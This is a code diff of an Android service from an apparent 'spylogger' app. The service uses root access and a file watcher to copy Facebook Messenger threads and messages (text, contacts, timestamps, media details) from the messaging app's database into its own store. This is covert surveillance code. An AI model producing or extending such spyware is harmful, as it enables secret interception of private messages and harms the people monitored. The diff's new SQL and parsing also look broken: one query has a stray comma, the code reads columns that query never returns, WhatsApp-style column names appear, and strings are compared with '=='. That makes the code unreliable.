@@ -8,35 +8,33 @@ import android.os.FileObserver;
 import android.os.IBinder;
 import android.util.Log;
 
-import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperInternal;
-import com.gravatasufoca.spylogger.model.messenger.Messages;
-import com.gravatasufoca.spylogger.model.messenger.Thread;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoMidia;
+import com.gravatasufoca.spylogger.model.Topico;
+import com.gravatasufoca.spylogger.model.messenger.Messages;
+import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
+import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.stmt.QueryBuilder;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
 
-import java.io.File;
-import java.io.IOException;
-import java.sql.SQLException;
-import java.util.HashSet;
+import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
-import java.util.Set;
 
 public class MessengerService extends Service {
 
 	private String pathToWatch;
-	private Dao<Messages, Integer> daoMensagensInterno;
-	private Dao<Messages, Integer> daoMensagensExterno;
+	private String inFileName;
+	private Dao<Messages, Integer> daoMsgExternal;
 
-	private Dao<Thread, Integer> daoThreadsInterno;
-	private Dao<Thread, Integer> daoThreadssExterno;
+	private DatabaseHelper dbHelper;
 
-
-	private DatabaseHelperInternal internal;
 	private DatabaseHelperFacebookThreads external;
 	private Configuracao configuracao;
     private final IBinder mBinder = new LocalBinder();
@@ -75,85 +73,26 @@ public class MessengerService extends Service {
 
 	@Override
 	public void onCreate() {
-		createDatabase();
-	}
-
-	private void createDatabase(){
 		pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;
+		try {
+			inFileName = getApplicationContext().getPackageManager()
+                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
+                    + "/databases/"+DatabaseHelperInternal.DATABASE_NAME;
+		} catch (NameNotFoundException e) {
+			e.printStackTrace();
+		}
 
 		chmod();
-		try {
-			String inFileName = getApplicationContext().getPackageManager()
-					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-					+ "/databases/"+DatabaseHelperInternal.DATABASE_NAME;
-
-			File dest = new File(inFileName);
-
-			if (!dest.exists()) {
-
-				File source = new File(pathToWatch);
-				try {
-
-					File dir = new File(
-							getApplicationContext().getPackageManager()
-									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-									+ "/databases/");
-					if (!dir.exists())
-						dir.mkdir();
-
-					dest.createNewFile();
-					Utils.copyFile(source, dest);
-				} catch (IOException e) {
-					e.printStackTrace();
-				}
-			}
-
-		} catch (NameNotFoundException e) {
-			e.printStackTrace();
-		}
 	}
 
-	private void clearDatabase(){
-		try {
-			File base = new File(
-					getApplicationContext().getPackageManager()
-							.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-							+ DatabaseHelperInternal.DATABASE_NAME);
-			if(base.exists()){
-				base.delete();
-			}
-
-		} catch (NameNotFoundException e) {
-			e.printStackTrace();
-		}
-	}
 
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
 		Log.d("FACESLOG - FLAGS", Integer.toString(flags));
-		chmod();
-		internal = new DatabaseHelperInternal(getApplicationContext());
-		external = new DatabaseHelperFacebookThreads(getApplicationContext());
 
-		try {
-			daoMensagensInterno = internal.getMessagesDao();
-			daoMensagensExterno = external.getMessagesDao();
-			daoThreadsInterno = internal.getThreadDao();
-			daoThreadssExterno = external.getThreadDao();
-			if(!daoMensagensInterno.isTableExists()){
-				clearDatabase();
-				createDatabase();
-				daoMensagensInterno = internal.getMessagesDao();
-				daoMensagensExterno = external.getMessagesDao();
-				daoThreadsInterno = internal.getThreadDao();
-				daoThreadssExterno = external.getThreadDao();
-			}
-
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+		updateMsg();
 
 		if(Utils.faceObserver==null)
 			setObserver();
@@ -173,7 +112,6 @@ public class MessengerService extends Service {
 				switch (event) {
 				case FileObserver.MODIFY:
 					Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
-					updateThread();
 					updateMsg();
 					break;
 				default:
@@ -187,78 +125,68 @@ public class MessengerService extends Service {
 	}
 
 
-	public Configuracao getConfiguracao() {
-		if(configuracao==null){
-			DatabaseHelper database = new DatabaseHelper(
-					getApplicationContext());
-			List<Configuracao> confs;
-			try {
-				confs = database.getConfiguracaoDao().queryForAll();
-				Configuracao conf = null;
-
-				if (confs.size() > 0) {
-					conf = confs.get(0);
-				}
-				if (conf != null) {
-					configuracao=conf;
-				}
-			} catch (Exception e) {
-			}
-		}
-		return configuracao;
-	}
-
-
-	private void updateThread() {
-
-		try {
-			List<Thread> threads = daoThreadsInterno.queryForAll();
-			List<Thread> m = daoThreadssExterno.queryForAll();
-			Set<Thread> nova = new HashSet<Thread>();
-			for (Thread thread : m) {
-
-				if (!threads.contains(thread)) {
-					nova.add(thread);
-				}
-
-			}
-
-			for (Thread thread : nova) {
-				try {
-					daoThreadsInterno.create(thread);
-				} catch (SQLException e) {
-					e.printStackTrace();
-				}
-			}
-
-		} catch (SQLException e) {
-			e.printStackTrace();
-		}
-	}
 
 	private void updateMsg() {
 
+		external = new DatabaseHelperFacebookThreads(getApplicationContext());
+		dbHelper = new DatabaseHelper((getApplicationContext()));
+
 		try {
-			List<Messages> mensagens = daoMensagensInterno.queryForAll();
-			List<Messages> m = daoMensagensExterno.queryForAll();
-			Set<Messages> nova = new HashSet<Messages>();
-			for (Messages mensagem : m) {
+			daoMsgExternal = external.getMessagesDao();
 
-				if (!mensagens.contains(mensagem)) {
-					nova.add(mensagem);
+			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");
+
+
+			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select msg_id, thread_key, from threads where msg_id not in( select idReferencia from localdb.topico )");
+			List<Topico> topicos=new ArrayList<>();
+
+			for(String[] resultRaw:raws){
+				Topico topico=new Topico.TopicoBuilder()
+						.setIdReferencia(resultRaw[0])
+						.setRemoteKey(resultRaw[1])
+						.setNome(resultRaw[2])
+						.setOrdenacao(new Date(Long.parseLong(resultRaw[3]))).build();
+
+				topicos.add(topico);
+			}
+			dbHelper.getTopicoDao().create(topicos);
+
+			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
+			List<Mensagem> mensagems=new ArrayList<>();
+			for(final String[] resultRaw:rawResults){
+				Topico tmpTopico=null;
+				for(Topico topico: topicos) {
+					if(topico.getRemoteKey().equals(resultRaw[1])) {
+						tmpTopico=topico;
+						break;
+					}
 				}
 
-			}
+				Mensagem mensagem = new Mensagem.MensagemBuilder()
+						.setIdReferencia(resultRaw[0])
+						.setRemetente(resultRaw[2] == "1")
+						.setTexto(resultRaw[3])
+						.setData(new Date(Long.parseLong(resultRaw[4])))
+						.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
+						.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
+						.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
+						.setContato(resultRaw[7])
+						.setTopico(tmpTopico)
+						.setTemMedia(resultRaw[9] == "1").build();
 
-			for (Messages mensagem : nova) {
-				try {
-					daoMensagensInterno.create(mensagem);
-				} catch (SQLException e) {
-					e.printStackTrace();
+				if(tmpTopico==null){
+					QueryBuilder<Topico,Integer> qb=dbHelper.getTopicoDao().queryBuilder();
+					qb.where().eq("remoteKey",resultRaw[1]);
+					tmpTopico=dbHelper.getTopicoDao().queryForFirst(qb.prepare());
+					mensagem.setTopico(tmpTopico);
 				}
+				mensagems.add(mensagem);
 			}
 
-		} catch (SQLException e) {
+			dbHelper.getMensagemDao().create(mensagems);
+
+
+		} catch (Exception e) {
 			e.printStackTrace();
 		}
 	}
